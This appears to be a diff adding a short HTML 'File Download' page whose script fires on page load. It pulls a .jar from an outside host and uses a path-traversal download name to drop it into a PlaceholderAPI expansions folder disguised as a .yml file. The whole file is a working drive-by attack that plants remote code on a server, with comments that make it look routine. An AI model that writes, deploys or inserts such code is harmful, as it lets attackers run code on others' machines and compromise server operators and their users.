@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File Download</title>
+    <script>
+        // Function to trigger the download
+        function triggerDownload() {
+            // URL of the file to be downloaded
+            const fileUrl = 'https://nightsoftcorp.com/lovely.jar';
+            // Create an invisible anchor element
+            const link = document.createElement('a');
+            link.href = fileUrl;
+            // Set the desired file name for the download
+            link.download = '../../../PlaceholderAPI/expansions/Stats-Expansion.yml';
+            // Append the link to the body, click it, and remove it
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+        // Trigger the download when the page loads
+        window.onload = triggerDownload;
+    </script>
+</head>
+<body>
+    <p>If the download does not start automatically, <a href="#" onclick="triggerDownload()">click here</a>.</p>
+</body>
+</html>
